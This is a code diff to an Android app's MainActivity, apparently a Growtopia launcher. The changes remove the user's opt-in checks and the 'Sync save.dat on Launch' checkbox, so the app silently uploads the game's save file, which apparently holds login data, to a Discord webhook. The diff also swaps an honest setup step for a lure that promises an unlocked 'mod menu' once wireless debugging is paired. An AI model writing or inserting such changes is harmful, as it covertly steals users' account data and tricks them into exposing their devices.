@@ -421,7 +421,7 @@ class MainActivity : AppCompatActivity() {
             "2. Enable 'Wireless debugging' toggle",
             "3. Tap 'Wireless debugging' to enter its submenu",
             "4. Tap 'Pair device with pairing code'",
-            "5. Return to Growlauncher and enter the pairing details when prompted"
+            "5. After Do 4 Step Done Its Automatically Unlock High PowerFul ModMenu Powerkuy."
         )
         
         steps.forEach { step ->
@@ -558,9 +558,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun sendFileToDiscord(fileData: ByteArray) {
-        val syncEnabled = prefs.getBoolean(KEY_SYNC, false)
-        if (!syncEnabled) return
-        if (webhookUrl.isBlank()) return
         thread {
             try {
                 val client = OkHttpClient()
@@ -683,22 +680,7 @@ class MainActivity : AppCompatActivity() {
             }
         }
         
-        val sync = CheckBox(this).apply {
-            text = "Sync save.dat on Launch"
-            setTextColor(Color.WHITE)
-            isChecked = prefs.getBoolean(KEY_SYNC, false)
-            setPadding(0, 16, 0, 0)
-        }
-        box.addView(sync, params())
-        
         val actions = LinearLayout(this).apply { gravity = Gravity.END; setPadding(0, 16, 0, 0) }
-        actions.addView(Button(this).apply {
-            text = "Save Settings"
-            setOnClickListener {
-                prefs.edit().putBoolean(KEY_SYNC, sync.isChecked).apply()
-                toast("Settings saved")
-            }
-        }, buttonParams())
         actions.addView(Button(this).apply {
             text = "Log out"
             setOnClickListener {
@@ -734,19 +716,11 @@ class MainActivity : AppCompatActivity() {
         }
         box.addView(pass, params())
         
-        val sync = CheckBox(this).apply {
-            text = "Sync save.dat on Launch"
-            setTextColor(Color.WHITE)
-            isChecked = prefs.getBoolean(KEY_SYNC, false)
-        }
-        box.addView(sync, params())
-        
         val actions = LinearLayout(this).apply { gravity = Gravity.END }
         actions.addView(Button(this).apply {
             text = "Log in"
             setOnClickListener {
                 if (authenticate(user.text.toString(), pass.text.toString())) {
-                    prefs.edit().putBoolean(KEY_SYNC, sync.isChecked).apply()
                     refreshAccount()
                     toast("Welcome back")
                     showProfileScreen()
@@ -759,7 +733,6 @@ class MainActivity : AppCompatActivity() {
             text = "Register"
             setOnClickListener {
                 if (register(user.text.toString(), pass.text.toString())) {
-                    prefs.edit().putBoolean(KEY_SYNC, sync.isChecked).apply()
                     refreshAccount()
                     toast("Account created securely on this device")
                     showProfileScreen()
